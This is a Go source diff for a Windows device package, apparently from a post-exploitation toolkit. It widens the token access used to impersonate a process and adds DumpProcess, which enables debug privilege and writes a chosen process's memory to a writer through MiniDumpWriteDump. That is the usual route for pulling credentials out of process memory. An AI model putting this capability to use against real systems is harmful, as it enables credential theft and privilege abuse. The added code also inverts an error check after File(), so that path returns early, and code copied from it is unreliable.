@@ -1,9 +1,9 @@
 //go:build windows
-// +build windows
 
 package device
 
 import (
+	"io"
 	"os"
 	"strings"
 	"unsafe"
@@ -19,6 +19,12 @@ import (
 // specific function.
 var ErrNoNix = xerr.Sub("only supported on *nix devices", 0xFB)
 
+type file interface {
+	File() (*os.File, error)
+}
+type fileFd interface {
+	Fd() uintptr
+}
 type privileges struct {
 	PrivilegeCount uint32
 	Privileges     [5]winapi.LUIDAndAttributes
@@ -212,7 +218,13 @@ func Impersonate(f *filter.Filter) error {
 	if f.Empty() {
 		return filter.ErrNoProcessFound
 	}
-	x, err := f.TokenFunc(0xE, nil)
+	// NOTE(dij): This makes sense to be used, but filter does call this under
+	//            the hood when doing a ranged lookup of processes.
+	//
+	//            Uncomment if this fixes any Access Denied bugs.
+	//
+	// winapi.GetDebugPrivilege()
+	x, err := f.TokenFunc(0x2000E, nil)
 	if err != nil {
 		return err
 	}
@@ -307,6 +319,60 @@ func forEachThread(f func(uintptr) error) error {
 	if winapi.CloseHandle(h); err == winapi.ErrNoMoreFiles {
 		return nil
 	}
+	return err
+}
+
+// DumpProcess will attempt to copy the memory of the targeted Filter to the
+// supplied Writer. This fill select the first process that matches the Filter.
+//
+// If the Filter is nil or empty or if an error occurs during reading/writing
+// an error will be returned.
+func DumpProcess(f *filter.Filter, w io.Writer) error {
+	if f.Empty() {
+		return filter.ErrNoProcessFound
+	}
+	if err := winapi.GetDebugPrivilege(); err != nil {
+		return err
+	}
+	h, err := f.HandleFunc(0x450, nil)
+	if err != nil {
+		return err
+	}
+	p, err := winapi.GetProcessID(h)
+	if err != nil {
+		winapi.CloseHandle(h)
+		return err
+	}
+	if v, ok := w.(fileFd); ok {
+		err = winapi.MiniDumpWriteDump(h, p, v.Fd(), 0x3)
+		winapi.CloseHandle(h)
+		return err
+	}
+	if v, ok := w.(file); ok {
+		x, err := v.File()
+		if err == nil {
+			winapi.CloseHandle(h)
+			return err
+		}
+		err = winapi.MiniDumpWriteDump(h, p, x.Fd(), 0x3)
+		winapi.CloseHandle(h)
+		return err
+	}
+	r, x, err := os.Pipe()
+	if err != nil {
+		winapi.CloseHandle(h)
+		return err
+	}
+	go func() {
+		if bugtrack.Enabled {
+			defer bugtrack.Recover("device.DumpProcess.func1()")
+		}
+		io.Copy(w, r)
+	}()
+	err = winapi.MiniDumpWriteDump(h, p, x.Fd(), 0x3)
+	x.Close()
+	r.Close()
+	winapi.CloseHandle(h)
 	return err
 }
 
